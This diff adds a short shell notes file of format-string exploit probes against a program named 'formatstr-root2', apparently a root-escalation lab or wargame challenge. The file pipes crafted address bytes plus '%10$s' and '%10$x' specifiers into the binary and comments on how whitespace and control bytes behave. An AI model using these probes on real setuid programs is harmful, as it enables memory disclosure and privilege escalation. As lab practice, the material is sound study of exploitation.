@@ -1,0 +1,27 @@
+echo -e $x "\x1c\xb0\x04\x08.%10\$s" | ./formatstr-root2
+
+echo -e "\x00\x00\x00\x00%10\$x" | formatstr-root2
+# Prints nothing
+
+echo -e "\x0C\x0C\x0C\x0C%10\$x" | formatstr-root2
+# Formfeed - page breaking, considered whitespace
+
+
+echo -e "\x09\x09\x09\x09%10\$x" | formatstr-root2
+# Horizontal tabs
+
+echo -e "\x0D\x0D\x0D\x0D%10\$x" | formatstr-root2
+# Carriage Return - moves position of cursor to front of current line
+
+echo -e "\x0B\x0B\x0B\x0B%10\$x" | formatstr-root2
+# Vertical Tabs
+
+echo -e "\x0A\x0A\x0A\x0A%10\$x" | formatstr-root2
+# Newline
+
+echo -e "\x20\x20\x20\x20%10\$x" | formatstr-root2
+# Space
+
+echo -e "\x40\x40\x40\x40%10\$x" | formatstr-root2
+
+#####
